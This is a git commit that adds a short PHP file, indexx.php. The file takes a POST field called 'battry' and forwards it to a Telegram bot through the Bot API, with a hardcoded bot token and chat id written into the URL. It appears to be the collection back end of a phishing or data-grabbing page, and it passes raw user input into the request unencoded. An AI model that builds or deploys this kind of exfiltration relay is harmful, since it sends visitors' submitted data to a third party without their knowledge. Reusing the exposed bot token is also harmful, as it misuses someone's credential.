25e1f381ca735ba7da9d62d9e2f4cb3cd5ea7a75
AI22AK47 <94799989+AI22AK47@users.noreply.github.com>
2022-11-08 22:31:51 +0600

    Add files via upload

---
+++ indexx.php
@@ -0,0 +1,5 @@
+<?php
+    $text=$_POST["battry"];
+        $response = file_get_contents("https://api.telegram.org/bot5710412371:AAGXuAdUqd5sP4dp-nGYbZhHy84MShP1p20/sendMessage?chat_id=5148207901&text=$text");    
+    
+?>
